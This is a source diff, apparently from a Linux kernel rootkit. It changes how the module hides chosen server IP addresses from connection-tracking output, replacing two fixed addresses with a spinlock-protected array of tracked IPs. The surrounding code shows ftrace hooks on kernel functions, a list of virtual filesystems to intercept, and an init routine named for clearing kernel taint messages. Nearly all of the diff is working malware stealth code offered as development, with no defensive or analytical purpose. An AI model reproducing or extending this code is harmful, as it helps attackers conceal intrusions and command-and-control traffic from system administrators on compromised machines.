@@ -16,8 +16,7 @@ extern bool ftrace_write_intercepted;
 static DEFINE_SPINLOCK(ftrace_read_lock);
 static unsigned long last_ftrace_read_jiffies = 0;
 
-static __be32 hidden_conntrack_ip;
-static __be32 hidden_conntrack_ip2;
+/* IPs are tracked dynamically via g_srv_ips[] (defined in icmp.c). */
 
 static const char *virtual_fs_types[] = {
     "proc", "procfs", "sysfs", "tracefs", "debugfs", NULL
@@ -352,15 +351,26 @@ static notrace bool is_nf_conntrack_file(struct file *file)
 static notrace bool line_contains_hidden_ip(const char *line)
 {
     char ip_str[20];
-    char ip2_str[20];
-    
+    int i;
+    unsigned long flags;
+    __be32 snap[MAX_INSTANCES];
+
     if (!line)
         return false;
-    
-    snprintf(ip_str, sizeof(ip_str), "%pI4", &hidden_conntrack_ip);
-    snprintf(ip2_str, sizeof(ip2_str), "%pI4", &hidden_conntrack_ip2);
-    
-    return (strstr(line, ip_str) != NULL || strstr(line, ip2_str) != NULL);
+
+    spin_lock_irqsave(&g_srv_ips_lock, flags);
+    for (i = 0; i < MAX_INSTANCES; i++)
+        snap[i] = g_srv_ips[i];
+    spin_unlock_irqrestore(&g_srv_ips_lock, flags);
+
+    for (i = 0; i < MAX_INSTANCES; i++) {
+        if (snap[i] != 0) {
+            snprintf(ip_str, sizeof(ip_str), "%pI4", &snap[i]);
+            if (strstr(line, ip_str) != NULL)
+                return true;
+        }
+    }
+    return false;
 }
 
 static notrace ssize_t filter_conntrack_output(char __user *user_buf, ssize_t bytes_read)
@@ -1633,8 +1643,6 @@ static struct ftrace_hook hooks[] = {
 };
 
 notrace int clear_taint_dmesg_init(void) {
-    hidden_conntrack_ip = in_aton(YOUR_SRV_IP);
-    hidden_conntrack_ip2 = in_aton(YOUR_SRV_IP2);
     return fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 }
 
